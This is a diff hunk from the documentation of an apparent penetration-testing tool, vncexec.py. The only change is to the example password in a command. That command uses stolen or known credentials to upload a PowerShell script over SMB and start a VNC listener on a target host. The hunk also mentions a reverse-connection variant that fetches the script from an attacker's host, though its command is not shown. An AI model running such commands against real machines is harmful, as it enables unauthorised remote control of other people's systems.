@@ -35,7 +35,7 @@ If you have authenticated access (password, nt hash or kerberos ticket) to the m
 
 Upload an encoded ps1 script as a bat file via SMB and execute the agent to bind a VNC port on target:
 ```
-vncexec.py  -invoke-vnc-path Invoke-Vnc.ps1 -contype bind -vncport 5900 -vncpass password  -method upload user:pass@target_ip
+vncexec.py -invoke-vnc-path Invoke-Vnc.ps1 -contype bind -vncport 5900 -vncpass P@ssw0rd -method upload user:pass@target_ip
 ```
 Download the script via HTTP from the attacker's host and execute the agent to get a reverse VNC connection:
 ```
